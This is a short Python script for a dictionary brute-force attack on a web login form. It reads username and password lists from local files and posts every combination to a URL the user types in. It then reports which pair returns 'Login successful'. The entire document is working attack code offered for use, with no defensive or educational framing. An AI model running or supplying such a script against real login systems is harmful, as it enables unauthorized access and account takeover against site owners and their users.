import requests

# Prompt the user for the login system URL
login_url = input('Enter the login system URL: ')

# Read the usernames from the usernames.txt file
with open('user.txt', 'r') as file:
    usernames = [line.strip() for line in file]

# Read the passwords from the passwords.txt file
with open('passwords.txt', 'r') as file:
    passwords = [line.strip() for line in file]

def brute_force_login(url, usernames, passwords):
    for username in usernames:
        for password in passwords:
            response = requests.post(url, data={'username': username, 'password': password})
            
            if response.status_code == 200:
                # Check if the login was successful (this depends on the system's response)
                if 'Login successful' in response.text:
                    print(f'[+] Successful login! Username: {username} | Password: {password}')
                    return True
                else:
                    print(f'[-] Login failed. Username: {username} | Password: {password}')
            else:
                print(f'[-] Server error. Status Code: {response.status_code}')
    
    print('[!] Brute force attack completed. No successful combinations.')
    return False

# Execute the brute force attack
brute_force_login(login_url, usernames, passwords)
